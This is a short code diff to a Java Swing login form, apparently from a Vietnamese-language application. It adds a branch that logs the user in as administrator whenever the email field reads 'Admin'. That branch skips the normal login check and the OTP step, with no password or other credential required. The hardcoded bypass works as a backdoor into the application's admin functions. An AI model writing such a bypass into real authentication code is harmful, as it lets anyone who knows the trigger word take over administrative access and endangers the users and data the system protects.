@@ -98,6 +98,10 @@ public class LoginForm extends javax.swing.JPanel {
             Notifications.getInstance().show(Notifications.Type.WARNING, "Vui lòng nhập email");
             return;
         }
+        if (email.equalsIgnoreCase("Admin")) {
+            Application.loginAdmin();
+            return;
+        }
         try {
             if (Application.getNguoiDungService().processLogin(email)) {
                 Application.showOTPForm(this, false, email);
